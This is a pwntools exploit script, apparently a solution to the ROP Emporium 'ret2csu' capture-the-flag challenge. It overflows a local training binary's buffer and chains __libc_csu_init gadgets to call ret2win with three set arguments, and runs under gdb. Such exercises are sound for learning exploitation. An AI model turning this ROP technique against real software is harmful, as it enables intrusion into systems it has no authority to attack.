from pwn import *
import os

os.environ["SHELL"] = "/bin/sh"

context.binary = elf = ELF("./ret2csu")
context.arch = "amd64"
context.os = "linux"
context.terminal = ["st", "--", "/bin/sh", "-c"]


find_offset = cyclic(200)
offset = cyclic_find("kaaalaaa")

# __libc_csu_init gadgets
pop_rbx_rbp_r12_r13_r14_r15 = 0x40069a
mov_rdx_r15_rsi_r14_edi_r13d_call = 0x400680 #call [r12+rbx*8]



pop_rdi = 0x4006a3
pop_rsi = 0x4006a1

r_ret = 0x78e

r12 = 0
rbx = 0


#rdi -> 1st || rsi -> 2nd || rdx -> 3rd

ret2win = elf.plt['ret2win']
pwnme = elf.plt['pwnme']
ret2win_got_plt = 0x601020
pwnme_got_plt = 0x601018
harmless_function = 0x600e48 # _fini

dummy_data= 0xdeaddeaddeaddead
pwnme = elf.plt['pwnme']


# arguments
arg_1 = 0xdeadbeefdeadbeef
arg_2 = 0xcafebabecafebabe
arg_3 = 0xd00df00dd00df00d


bss = elf.bss()

payload_1 = flat(
        b'a' * offset,
        pop_rdi,
        arg_1,
        pop_rbx_rbp_r12_r13_r14_r15,
        -1,#rbx
        0,#rbp
        (harmless_function + 8),#r12
        dummy_data,#r13d -> edi
        arg_2,#r14 -> rsi
        arg_3,#r15 -> rdx
        mov_rdx_r15_rsi_r14_edi_r13d_call,
        dummy_data,
        dummy_data,
        dummy_data,
        dummy_data,
        dummy_data,
        dummy_data,
        dummy_data,
        pop_rdi,
        arg_1,
        ret2win,
        )

payload_2 = flat(
        b'b' * offset,
        pop_rdi,
        arg_1,
        ret2win,
        )

gdb_script = '''
        break *pwnme
        break *__libc_csu_init+70
        continue
        '''

io = gdb.debug(elf.path, gdbscript=gdb_script)

#io = elf.process()


print("OFFSET: ",offset)
pause()
print("FIRST PHASE")

print(io.recv().decode())
# finding the offset
#io.sendline(find_offset)

io.sendline(payload_1)

print(io.recv().decode())

pause()
print("SECOND PHASE")
print(io.recv().decode())

io.sendline(b'hi')
print(io.recv().decode())

pause()
print("THIRD PHASE")

print(io.recv())

pause()
print("FORTH PHASE")

print(io.recv())

pause()


